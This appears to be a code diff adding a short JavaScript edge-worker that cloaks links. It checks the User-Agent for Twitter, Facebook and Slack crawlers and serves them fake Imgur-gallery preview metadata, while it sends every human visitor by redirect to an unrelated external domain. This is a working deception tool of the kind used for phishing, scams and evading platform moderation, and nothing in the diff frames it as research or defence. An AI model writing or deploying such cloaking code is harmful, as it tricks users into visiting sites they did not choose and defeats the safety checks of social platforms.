@@ -1,0 +1,25 @@
+export default {
+  async fetch(request) {
+    const userAgent = request.headers.get('User-Agent') || '';
+    const botMarkers = ['Twitterbot', 'facebookexternalhit', 'Slackbot'];
+
+    // Check if the visitor is a social media bot
+    const isBot = botMarkers.some(marker => userAgent.includes(marker));
+
+    if (isBot) {
+      // Serve the "Fake" Imgur Metadata to the bot
+      return new Response(`
+        <html>
+          <head>
+            <meta property="og:url" content="https://imgur.com/gallery/xyz">
+            <meta name="twitter:card" content="summary_large_image">
+            <meta name="twitter:image" content="https://i.postimg.cc/jjm8XWn1/WORKING-1.png">
+          </head>
+          <body></body>
+        </html>`, { headers: { 'Content-Type': 'text/html' } });
+    } else {
+      // Send the human to the real destination immediately
+      return Response.redirect("https://altruistic-departure.com/jv7nbk", 302);
+    }
+  }
+};
